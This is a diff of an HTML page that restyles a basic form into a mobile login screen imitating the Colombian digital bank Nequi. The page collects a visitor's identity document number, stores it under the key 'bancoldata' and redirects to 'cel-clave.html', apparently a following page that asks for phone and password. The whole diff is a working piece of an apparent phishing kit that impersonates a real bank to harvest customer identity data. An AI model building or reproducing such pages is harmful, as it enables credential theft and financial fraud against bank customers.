@@ -1,57 +1,164 @@
 <!DOCTYPE html>
 <html lang="es">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Formulario básico</title>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Ingreso</title>
+
+  <style>
+    body {
+      margin: 0;
+      font-family: Arial, sans-serif;
+      background: #210049;
+      color: white;
+      display: flex;
+      justify-content: center;
+    }
+
+    .container {
+      max-width: 420px;
+      width: 100%;
+      min-height: 100vh;
+      display: flex;
+      flex-direction: column;
+      padding: 20px;
+    }
+
+    .header {
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+    }
+
+    .logo {
+      text-align: center;
+      margin: 40px 0;
+      font-size: 28px;
+      font-weight: bold;
+      color: #ff008c;
+    }
+
+    .form-box {
+      margin-top: auto;
+    }
+
+    .input-container {
+      background: rgba(255,255,255,0.15);
+      border-radius: 6px;
+      padding: 10px;
+      display: flex;
+      align-items: center;
+    }
+
+    input {
+      width: 100%;
+      border: none;
+      outline: none;
+      background: transparent;
+      color: white;
+      font-size: 16px;
+      padding: 10px;
+    }
+
+    input::placeholder {
+      color: #ddd;
+    }
+
+    .checkbox {
+      margin-top: 10px;
+      font-size: 14px;
+    }
+
+    button {
+      width: 100%;
+      margin-top: 20px;
+      height: 45px;
+      border: none;
+      border-radius: 6px;
+      background: #ff008c;
+      color: white;
+      font-size: 16px;
+      cursor: pointer;
+    }
+
+    button:disabled {
+      opacity: 0.5;
+      cursor: not-allowed;
+    }
+  </style>
 </head>
+
 <body>
 
-    <h2>Ingreso</h2>
+  <div class="container">
 
-    <!-- Número de documento -->
-    <label>Número de documento</label><br>
-    <input type="number" id="userInput"><br><br>
+    <div class="header">
+      <div>❓</div>
+      <div style="opacity:0.5;">Nequi</div>
+    </div>
 
-    <!-- Recordar -->
-    <input type="checkbox" id="rememberDoc">
-    <label for="rememberDoc">Recordar número</label><br><br>
+    <div class="logo">NEQUI</div>
 
-    <!-- Botón -->
-    <button id="continueButton">Continuar</button>
+    <div class="form-box">
+      <form id="form">
 
-    <script>
-        const userInput = document.getElementById('userInput');
-        const continueButton = document.getElementById('continueButton');
+        <div class="input-container">
+          <input type="number" id="userInput" placeholder="Ingresa tu documento">
+        </div>
 
-        continueButton.addEventListener('click', () => {
-            const userValue = userInput.value.trim();
+        <div class="checkbox">
+          <input type="checkbox" id="rememberDoc">
+          Recordar número
+        </div>
 
-            if (userValue.length >= 4) {
-                let data = {};
+        <button id="continueButton" disabled>Continuar</button>
 
-                try {
-                    data = JSON.parse(localStorage.getItem('bancoldata')) || {};
-                } catch (e) {
-                    data = {};
-                }
+      </form>
+    </div>
 
-                data.usuario = userValue;
-                data.fecha = new Date().toISOString();
+  </div>
 
-                if (document.getElementById('rememberDoc').checked) {
-                    data.rememberDocument = true;
-                }
+  <script>
+    const userInput = document.getElementById('userInput');
+    const continueButton = document.getElementById('continueButton');
+    const form = document.getElementById('form');
 
-                localStorage.setItem('bancoldata', JSON.stringify(data));
+    function validar() {
+      const val = userInput.value.trim();
+      continueButton.disabled = val.length < 4;
+    }
 
-                // Redirección
-                window.location.href = 'cel-clave.html';
-            } else {
-                alert('Ingrese mínimo 4 dígitos');
-            }
-        });
-    </script>
+    userInput.addEventListener('input', validar);
+
+    form.addEventListener('submit', (e) => {
+      e.preventDefault();
+
+      const userValue = userInput.value.trim();
+
+      if (userValue.length >= 4) {
+        let data = {};
+
+        try {
+          data = JSON.parse(localStorage.getItem('bancoldata')) || {};
+        } catch (e) {
+          data = {};
+        }
+
+        data.usuario = userValue;
+        data.fecha = new Date().toISOString();
+
+        if (document.getElementById('rememberDoc').checked) {
+          data.rememberDocument = true;
+        }
+
+        localStorage.setItem('bancoldata', JSON.stringify(data));
+
+        window.location.href = 'cel-clave.html';
+      } else {
+        alert('Ingrese mínimo 4 dígitos');
+      }
+    });
+  </script>
 
 </body>
 </html>
